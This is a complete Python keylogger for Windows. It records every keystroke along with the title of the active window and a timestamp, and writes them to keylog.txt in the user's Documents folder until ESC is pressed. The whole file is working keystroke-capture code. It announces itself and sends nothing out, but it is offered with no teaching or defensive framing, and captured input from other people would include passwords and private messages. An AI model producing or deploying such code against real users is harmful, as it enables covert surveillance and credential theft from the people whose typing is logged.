import logging
from pynput import keyboard
from datetime import datetime
import win32gui
import os

# Get the path to the user's documents folder
documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
# Define the log file path within the documents folder
log_file = os.path.join(documents_path, "keylog.txt")

# Configure logging
# The format already includes the timestamp (%(asctime)s), so we don't need it in the message itself.
logging.basicConfig(filename=log_file,
                    level=logging.DEBUG,
                    format='%(asctime)s - %(message)s')

def get_active_window():
    """Gets the title of the currently active window."""
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except Exception:
        return "Unknown Window"

def on_press(key):
    """Logs the key press along with the active window title."""
    active_window = get_active_window()
    try:
        # For regular character keys
        logging.info(f"({active_window}) -> '{key.char}'")
    except AttributeError:
        # For special keys (e.g., Shift, Ctrl, Space)
        logging.info(f"({active_window}) -> [{key}]")

def on_release(key):
    """Stops the listener when the ESC key is released."""
    if key == keyboard.Key.esc:
        logging.warning("Listener stopped by user.")
        return False

print(f"Keylogger Started... Press ESC to stop. Logging to: {log_file}")

# Create and start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")